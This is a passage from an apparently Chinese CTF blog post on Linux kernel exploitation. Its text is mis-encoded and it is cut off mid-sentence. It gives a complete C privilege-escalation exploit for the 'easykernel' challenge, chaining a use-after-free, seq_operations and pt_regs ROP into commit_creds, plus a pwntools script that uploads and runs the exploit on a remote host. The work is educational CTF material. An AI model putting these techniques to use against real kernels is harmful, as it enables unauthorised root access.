class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs DIFF"><span class="hljs-comment">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span><br><span class="hljs-comment">index 4efd39aacb9f2..7b2542b13ebd9 100644</span><br><span class="hljs-comment">--- a/arch/x86/entry/common.c</span><br><span class="hljs-comment">+++ b/arch/x86/entry/common.c</span><br><span class="hljs-meta">@@ -38,6 +38,7 @@</span><br> #ifdef CONFIG_X86_64<br> __visible noinstr void do_syscall_64(unsigned long nr, struct pt_regs *regs)<br> &#123;<br><span class="hljs-addition">+    add_random_kstack_offset();</span><br>     nr = syscall_enter_from_user_mode(regs, nr);<br><br>     instrumentation_begin();<br></code></pre></div></td></tr></table></figure><p>å½“ç„¶ï¼Œè‹¥æ˜¯åœ¨è¿™ä¸ªéšæœºåç§»å€¼è¾ƒå°ä¸”æˆ‘ä»¬ä»æœ‰è¶³å¤Ÿå¤šçš„å¯„å­˜å™¨å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œä»ç„¶å¯ä»¥é€šè¿‡å¸ƒç½®ä¸€äº› slide gadget æ¥ç»§ç»­å®Œæˆåˆ©ç”¨ï¼Œä¸è¿‡ç¨³å®šæ€§ä¹Ÿå¤§å¹…ä¸‹é™äº†ï¼Œ <em>å¯ä»¥è¯´è¿™ç§åˆ©ç”¨æ–¹å¼åŸºæœ¬ä¸Šæ˜¯åºŸäº†</em> </p><h3 id="ä¾‹é¢˜ï¼šè¥¿æ¹–è®ºå‰‘2021çº¿ä¸Šåˆèµ›-easykernel"><a href="#ä¾‹é¢˜ï¼šè¥¿æ¹–è®ºå‰‘2021çº¿ä¸Šåˆèµ›-easykernel" class="headerlink" title="ä¾‹é¢˜ï¼šè¥¿æ¹–è®ºå‰‘2021çº¿ä¸Šåˆèµ› - easykernel"></a><em>ä¾‹é¢˜ï¼šè¥¿æ¹–è®ºå‰‘2021çº¿ä¸Šåˆèµ› - easykernel</em></h3><p>ä»Šå¹´çš„è¥¿æ¹–è®ºå‰‘çš„å®£ä¼ æ¯”ä»¥å¾€çš„é˜µåŠ¿è¦å¤§å¾—å¤šï¼Œç¬”è€…åœ¨å­¦æ ¡é¥­å ‚åƒå®Œé¥­å‡ºæ¥éƒ½èƒ½ç¢°åˆ°å‘ä¼ å•çš„ï¼Œè¿™ä¸€æ¬¡ç¬”è€…ä¸ç¬”è€…çš„é˜Ÿå‹ä¹Ÿå‚åŠ äº†æœ¬æ¬¡çš„è¥¿æ¹–è®ºå‰‘CTFï¼Œå…¶ä¸­æœ‰ä¸€é“ easykernl ç®—æ˜¯ä¸€é“è´¨é‡è¿˜å¯ä»¥çš„çš„ kernel pwn å…¥é—¨é¢˜ï¼Œå¯æƒœåœ¨æ¯”èµ›æ—¶ç¬”è€…æ‰‹æ…¢ä¸€æ­¥åªæ‹¿åˆ°äº†ä¸‰è¡€</p><p>é—²è¯ä¸å¤šè¯´ï¼Œä»¥ä¸‹æ˜¯é¢˜è§£</p><h4 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>é¦–å…ˆæŸ¥çœ‹å¯åŠ¨è„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs BASH"><span class="hljs-meta">#!/bin/sh</span><br><br>qemu-system-x86_64  \<br>-m 64M \<br>-cpu kvm64,+smep \<br>-kernel ./bzImage \<br>-initrd rootfs.img \<br>-nographic \<br>-s \<br>-append <span class="hljs-string">&quot;console=ttyS0 kaslr quiet noapic&quot;</span><br></code></pre></div></td></tr></table></figure><p>å¼€äº† SMEP å’Œ KASLR</p><p>è¿è¡Œå¯åŠ¨è„šæœ¬ï¼ŒæŸ¥çœ‹ <code>/sys/devices/system/cpu/vulnerabilities/*</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL">/ $ cat /sys/devices/system/cpu/vulnerabilities/*<br>KVM: Mitigation: VMX unsupported<br>Mitigation: PTE Inversion<br>Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown<br>Mitigation: PTI<br>Vulnerable<br>Mitigation: usercopy/swapgs barriers and __user pointer sanitization<br>Mitigation: Full generic retpoline, STIBP: disabled, RSB filling<br>Not affected<br>Not affected<br></code></pre></div></td></tr></table></figure><p>å¼€å¯äº† PTI ï¼ˆé¡µè¡¨éš”ç¦»ï¼‰</p><p>é¢˜ç›®ç»™äº†ä¸ª test.koï¼ŒæŒ‰æƒ¯ä¾‹è¿™å°±æ˜¯æœ‰æ¼æ´çš„ LKM</p><p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼Œå‘ç°åªå®šä¹‰äº† ioctlï¼Œå¯ä»¥çœ‹å‡ºæ˜¯å¸¸è§çš„â€œèœå•å †â€ï¼Œç»™å‡ºäº†åˆ†é…ã€é‡Šæ”¾ã€è¯»ã€å†™ object çš„åŠŸèƒ½</p><p><a href="https://i.loli.net/2021/11/20/y7KwuZB3tTehGHP.png"><img src="https://s2.loli.net/2023/02/06/BnbpHJuislK258F.png" alt="image.png"></a></p><p>å¯¹äºåˆ†é… objectï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥å¦‚ä¸‹å½¢å¼ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> size;<br>    <span class="hljs-keyword">void</span> *buf;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å¯¹äºé‡Šæ”¾ã€è¯»ã€å†™ objectï¼Œåˆ™éœ€è¦ä¼ å…¥å¦‚ä¸‹å½¢å¼ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> idx;<br>    <span class="hljs-keyword">size_t</span> size;<br>    <span class="hljs-keyword">void</span> *buf;<br>&#125;;<br></code></pre></div></td></tr></table></figure><h5 id="åˆ†é…ï¼š0x20"><a href="#åˆ†é…ï¼š0x20" class="headerlink" title="åˆ†é…ï¼š0x20"></a>åˆ†é…ï¼š0x20</h5><p>æ¯”è¾ƒå¸¸è§„çš„ kmallocï¼Œæ²¡æœ‰é™åˆ¶sizeï¼Œæœ€å¤šå¯ä»¥åˆ†é… 0x20 ä¸ª chunk</p><p><a href="https://i.loli.net/2021/11/20/hzcYQx6OD7uVP5T.png"><img src="https://s2.loli.net/2023/02/06/trFU3IQ4BShEa8P.png" alt="image.png"></a></p><h5 id="é‡Šæ”¾ï¼š0x30"><a href="#é‡Šæ”¾ï¼š0x30" class="headerlink" title="é‡Šæ”¾ï¼š0x30"></a>é‡Šæ”¾ï¼š0x30</h5><p><strong>kfree ä»¥åæ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆï¼Œç›´æ¥å°±æœ‰ä¸€ä¸ªè£¸çš„ UAF ç³Šè„¸</strong></p><p><a href="https://i.loli.net/2021/11/20/jGy6mShgPAIJeQN.png"><img src="https://s2.loli.net/2023/02/06/IkDQYizFE9pcPfZ.png" alt="image.png"></a></p><h5 id="è¯»ï¼š0x40"><a href="#è¯»ï¼š0x40" class="headerlink" title="è¯»ï¼š0x40"></a>è¯»ï¼š0x40</h5><p>ä¼šè°ƒç”¨ show å‡½æ•°</p><p><a href="https://i.loli.net/2021/11/20/MKeuzEXod94lI12.png"><img src="https://s2.loli.net/2023/02/06/5C3VUTL8xYsHuea.png" alt="image.png"></a></p><p>å…¶å®å°±æ˜¯å¥—äº†ä¸€å±‚çš®çš„è¯» object å†…å®¹ï¼ŒåŠ äº†ä¸€ç‚¹ç‚¹è¶Šç•Œæ£€æŸ¥</p><p><a href="https://i.loli.net/2021/11/20/5RsVwHToCYXdAIa.png"><img src="https://s2.loli.net/2023/02/06/4MEtVryJAuGPXpi.png" alt="image.png"></a></p><h5 id="å†™ï¼š0x50"><a href="#å†™ï¼š0x50" class="headerlink" title="å†™ï¼š0x50"></a>å†™ï¼š0x50</h5><p>å¸¸è§„çš„å†™å…¥ objectï¼ŒåŠ äº†ä¸€ç‚¹ç‚¹æ£€æŸ¥</p><p><a href="https://i.loli.net/2021/11/20/VFX2SgEn6YR9v3M.png"><img src="https://s2.loli.net/2023/02/06/aoWNJuMTYfmDUeK.png" alt="image.png"></a></p><h4 id="è§£æ³•ï¼šUAF-seq-operations-pt-regs-ROP"><a href="#è§£æ³•ï¼šUAF-seq-operations-pt-regs-ROP" class="headerlink" title="è§£æ³•ï¼šUAF + seq_operations + pt_regs + ROP"></a>è§£æ³•ï¼šUAF + seq_operations + pt_regs + ROP</h4><p>é¢˜ç›®æ²¡æœ‰è¯´æ˜ï¼Œé‚£ç¬”è€…é»˜è®¤åº”è¯¥æ˜¯æ²¡å¼€ Hardened Freelistï¼Œç°åœ¨åˆæœ‰ UAFï¼Œé‚£ä¹ˆè§£æ³•å°±æ˜¯å¤šç§å¤šæ ·çš„äº†ï¼Œç¬”è€…è¿™é‡Œé€‰æ‹©ç”¨ <code>seq_operations ç»“æ„ä½“</code> + <code>pt_regs ç»“æ„ä½“</code>æ„é€  ROP è¿›è¡Œææƒ</p><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> COMMIT_CREDS 0xffffffff810c8d40</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEQ_OPS_0 0xffffffff81319d30</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INIT_CRED 0xffffffff82663300</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDI_RET 0xffffffff81089250</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><br><span class="hljs-keyword">long</span> dev_fd;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span>  idx;<br>    <span class="hljs-keyword">size_t</span>  size;<br>    <span class="hljs-keyword">void</span>    *buf;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span>  size;<br>    <span class="hljs-keyword">void</span>    *buf;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">readChunk</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">void</span> *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span> <span class="hljs-title">op</span> =</span> <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x40</span>, &amp;op);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">writeChunk</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">void</span> *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span> <span class="hljs-title">op</span> =</span> <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x50</span>, &amp;op);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deleteChunk</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span> <span class="hljs-title">op</span> =</span> <br>    &#123;<br>        .idx = idx,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x30</span>, &amp;op);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">allocChunk</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">void</span> *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_chunk</span> <span class="hljs-title">alloc</span> =</span> <br>    &#123;<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x20</span>, &amp;alloc);<br>&#125;<br><br><span class="hljs-keyword">size_t</span>      buf[<span class="hljs-number">0x100</span>];<br><span class="hljs-keyword">size_t</span>      swapgs_restore_regs_and_return_to_usermode;<br><span class="hljs-keyword">size_t</span>      init_cred;<br><span class="hljs-keyword">size_t</span>      pop_rdi_ret;<br><span class="hljs-keyword">long</span>        seq_fd;<br><span class="hljs-keyword">void</span> *      kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-keyword">size_t</span>      kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">size_t</span>      commit_creds;<br><span class="hljs-keyword">size_t</span>      gadget;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv, <span class="hljs-keyword">char</span> ** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kerpwn&quot;</span>, O_RDWR);<br><br>    allocChunk(<span class="hljs-number">0x20</span>, buf);<br>    deleteChunk(<span class="hljs-number">0</span>);<br>    seq_fd = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    readChunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, buf);<br><br>    kernel_offset = buf[<span class="hljs-number">0</span>] - SEQ_OPS_0;<br>    kernel_base += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset;<br>    init_cred = INIT_CRED + kernel_offset;<br>    pop_rdi_ret = POP_RDI_RET + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    gadget = <span class="hljs-number">0xffffffff8135b0f6</span> + kernel_offset; <span class="hljs-comment">// add rsp ä¸€ä¸ªæ•°ç„¶å pop ä¸€å †å¯„å­˜å™¨æœ€åretï¼Œå…·ä½“çš„ä¸è®°å¾—äº†ï¼Œæ‡’å¾—å†å›å»ç¿»äº†</span><br><br>    buf[<span class="hljs-number">0</span>] = gadget;<br>    swapgs_restore_regs_and_return_to_usermode += <span class="hljs-number">9</span>;<br>    writeChunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, buf);<br><br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15, 0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, pop_rdi_ret;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, init_cred;&quot;</span> <span class="hljs-comment">// add rsp, 0x40 ; ret</span><br>        <span class="hljs-string">&quot;mov r12, commit_creds;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx, 0x999999999;&quot;</span><br>        <span class="hljs-string">&quot;mov r11, 0x114514;&quot;</span><br>        <span class="hljs-string">&quot;mov r10, 0x666666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r9, 0x1919114514;&quot;</span><br>        <span class="hljs-string">&quot;mov r8, 0xabcd1919810;&quot;</span><br>        <span class="hljs-string">&quot;xor rax, rax;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx, 0x666666;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx, 8;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi, rsp;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, seq_fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿œç¨‹è®¾ç½®äº†120så…³æœºï¼Œglibc ç¼–è¯‘å‡ºæ¥çš„å¯æ‰§è¡Œæ–‡ä»¶ä¼šæ¯”è¾ƒå¤§æ²¡æ³•ä¼ å®Œï¼Œ<strong>è¿™é‡Œç¬”è€…é€‰æ‹©ä½¿ç”¨ musl</strong> </p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL">musl-gcc exp.c -o exp -static -masm=intel<br></code></pre></div></td></tr></table></figure><blockquote><p>å…¶å®å†™çº¯æ±‡ç¼–æ˜¯æœ€å°çš„ï¼Œä½†æ˜¯ç€æ€¥æŠ¢ä¸€è¡€æ‰€ä»¥è¿˜æ˜¯å†™å¸¸è§„çš„Cï¼Œæ—©ä¸Šåˆæœ‰ä¸€ä¸ªå®éªŒè¦åšæŠŠæ—¶é—´å æ‰äº†ç»“æœæœ€ååªæ‹¿äº†ä¸‰è¡€â€¦</p></blockquote><p>æ‰“è¿œç¨‹ç”¨çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    exp = base64.b64encode(f.read())<br><br>p = remote(<span class="hljs-string">&quot;82.157.40.132&quot;</span>, <span class="hljs-number">54100</span>)<br>try_count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p.sendline()<br>    p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp), <span class="hljs-number">0x200</span>):<br>        p.sendline(<span class="hljs-string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="hljs-number">0x200</span>].decode() + <span class="hljs-string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)<br>        count += <span class="hljs-number">1</span><br>        log.info(<span class="hljs-string">&quot;count: &quot;</span> + <span class="hljs-built_in">str</span>(count))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br><br>    p.sendline(<span class="hljs-string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;chmod +x /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;/tmp/exploit &quot;</span>)<br>    <span class="hljs-keyword">break</span><br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>ä¼ è¿œç¨‹ï¼Œè¿è¡Œï¼ŒæˆåŠŸææƒ</p><p><a href="https://i.loli.net/2021/11/20/4Mtasj1QRYUAhcI.png"><img src="https://s2.loli.net/2023/02/06/tBgqLoSiPT5Hj3d.png" alt="image.png"></a></p><h2 id="setxattr-userfaultfd-å †å ä½æŠ€æœ¯ï¼ˆmay-obsoleteï¼‰"><a href="#setxattr-userfaultfd-å †å ä½æŠ€æœ¯ï¼ˆmay-obsoleteï¼‰" class="headerlink" title="setxattr + userfaultfd å †å ä½æŠ€æœ¯ï¼ˆmay obsoleteï¼‰"></a>setxattr + userfaultfd å †å ä½æŠ€æœ¯ï¼ˆmay obsoleteï¼‰</h2><p>setxattr æ˜¯ä¸€ä¸ªååˆ†ç‹¬ç‰¹çš„ç³»ç»Ÿè°ƒç”¨æ—ï¼ŒæŠ›å¼€å…¶æœ¬èº«çš„åŠŸèƒ½ï¼Œåœ¨ kernel çš„åˆ©ç”¨å½“ä¸­ä»–å¯ä»¥ä¸ºæˆ‘ä»¬æä¾›<strong>è¿‘ä¹ä»»æ„å¤§å°çš„å†…æ ¸ç©ºé—´ object åˆ†é…</strong></p><p>è§‚å¯Ÿ setxattr æºç ï¼Œå‘ç°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ISBL"><span class="hljs-function"><span class="hljs-title">SYS_setxattr</span>()</span><br>    <span class="hljs-function"><span class="hljs-title">path_setxattr</span>()</span><br>        <span class="hljs-function"><span class="hljs-title">setxattr</span>()</span><br></code></pre></div></td></tr></table></figure><p>åœ¨ <code>setxattr()</code> å‡½æ•°ä¸­æœ‰å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span></span><br><span class="hljs-function"><span class="hljs-title">setxattr</span><span class="hljs-params">(struct dentry *d, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __user *name, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> __user *value,</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">int</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//...</span><br>        kvalue = kvmalloc(size, GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!kvalue)<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        <span class="hljs-keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;<br><br>    <span class="hljs-comment">//,..</span><br><br>    kvfree(kvalue);<br><br>    <span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œçš„ value å’Œ size éƒ½æ˜¯ç”±æˆ‘ä»¬æ¥æŒ‡å®šçš„ï¼Œå³<strong>æˆ‘ä»¬å¯ä»¥åˆ†é…ä»»æ„å¤§å°çš„ object å¹¶å‘å…¶ä¸­å†™å…¥å†…å®¹</strong> </p><p>ä½†æ˜¯è¯¥ object åœ¨ setxattr æ‰§è¡Œç»“æŸæ—¶åˆä¼šè¢«æ”¾å› freelist ä¸­ï¼Œè®¾æƒ³è‹¥æ˜¯æˆ‘ä»¬éœ€è¦åŠ«æŒè¯¥ object çš„å‰ 8 å­—èŠ‚ï¼Œé‚£å°†å‰åŠŸå°½å¼ƒ</p><p>é‡æ–°è€ƒè™‘ setxattr çš„æ‰§è¡Œæµç¨‹ï¼Œå…¶ä¸­ä¼šè°ƒç”¨ <code>copy_from_user</code> ä»ç”¨æˆ·ç©ºé—´æ‹·è´æ•°æ®ï¼Œé‚£ä¹ˆè®©æˆ‘ä»¬è€ƒè™‘å¦‚ä¸‹åœºæ™¯ï¼š</p><p>æˆ‘ä»¬é€šè¿‡ mmap åˆ†é…è¿ç»­çš„ä¸¤ä¸ªé¡µé¢ï¼Œåœ¨ç¬¬äºŒä¸ªé¡µé¢ä¸Šå¯ç”¨ userfaultfdï¼Œå¹¶åœ¨ç¬¬ä¸€ä¸ªé¡µé¢çš„æœ«å°¾å†™å…¥æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ï¼Œæ­¤æ—¶æˆ‘ä»¬è°ƒç”¨ setxattr è¿›è¡Œ<strong>è·¨é¡µé¢çš„æ‹·è´</strong>ï¼Œå½“ copy_from_user æ‹·è´åˆ°ç¬¬äºŒä¸ªé¡µé¢æ—¶<strong>ä¾¿ä¼šè§¦å‘ 